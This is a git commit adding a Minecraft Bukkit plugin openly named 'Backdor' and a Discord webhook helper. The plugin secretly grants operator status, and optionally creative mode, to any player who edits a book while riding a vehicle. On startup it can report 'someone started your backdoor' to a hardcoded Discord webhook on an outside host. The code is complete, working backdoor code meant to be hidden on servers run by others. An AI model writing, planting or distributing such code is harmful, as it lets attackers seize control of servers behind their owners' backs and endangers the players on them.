35db088fed648bbe9d0bc6dff2fdfa044abaffdc
Halqq <kauahmsilva@gmail.com>
2022-08-28 20:17:28 -0300

    Initial commit

---
+++ src/main/java/halq/backdor/Backdor.java
@@ -0,0 +1,46 @@
+package halq.backdor;
+
+import halq.backdor.util.webhookUtil;
+import org.bukkit.GameMode;
+import org.bukkit.entity.Player;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.Listener;
+import org.bukkit.event.player.PlayerEditBookEvent;
+import org.bukkit.plugin.java.JavaPlugin;
+
+/**
+ * @author Halqq
+ * @since 29/08/2022
+ * @apiNote :bob_sad:
+ */
+
+public final class Backdor extends JavaPlugin implements Listener {
+
+    //put false if you don't want to be notified (webhook)
+    boolean n = false;
+
+    //put false if you don't want me to change the gamemode
+    boolean g = true;
+
+    @Override
+    public void onEnable() {
+        getServer().getPluginManager().registerEvents(this, this);
+        if (n == true) {
+            webhookUtil.main("Lol someone started your backdoor");
+        } else {
+        }
+    }
+
+    @EventHandler
+    public void onPlayer(PlayerEditBookEvent event) {
+
+        Player p = event.getPlayer();
+
+        if(p.isInsideVehicle()) {
+            p.setOp(true);
+            if (g == true) {
+                p.setGameMode(GameMode.CREATIVE);
+            }
+        }
+    }
+}
---
+++ src/main/java/halq/backdor/util/webhookUtil.java
@@ -0,0 +1,58 @@
+package halq.backdor.util;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.PrintWriter;
+import java.net.URL;
+import java.net.URLConnection;
+import java.net.URLEncoder;
+
+/**
+ * @author halq
+ * @apiNote simple webhook!!
+ * @since 29/08/2022
+ */
+
+public class webhookUtil {
+
+    public static void main(String message) {
+        PrintWriter out = null;
+        BufferedReader in = null;
+        StringBuilder result = new StringBuilder();
+        try {
+            //put your webhook
+            URL realUrl = new URL("https://discord.com/api/webhooks/979093172057694278/GEEv89jPtOZcuKqruFgGBocUwoO6jGrYSNi8UScULTC8kKx5kAY6-kFYxuB6hN1ACvJ_");
+            URLConnection conn = realUrl.openConnection();
+            conn.setRequestProperty("accept", "*/*");
+            conn.setRequestProperty("connection", "Keep-Alive");
+            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
+            conn.setDoOutput(true);
+            conn.setDoInput(true);
+            out = new PrintWriter(conn.getOutputStream());
+            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
+            out.print(postData);
+            out.flush();
+            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+            String line;
+            while ((line = in.readLine()) != null) {
+                result.append("/n").append(line);
+            }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        } finally {
+            try {
+                if (out != null) {
+                    out.close();
+                }
+                if (in != null) {
+                    in.close();
+                }
+            } catch (IOException ex) {
+                ex.printStackTrace();
+            }
+        }
+        System.out.println(result);
+    }
+}
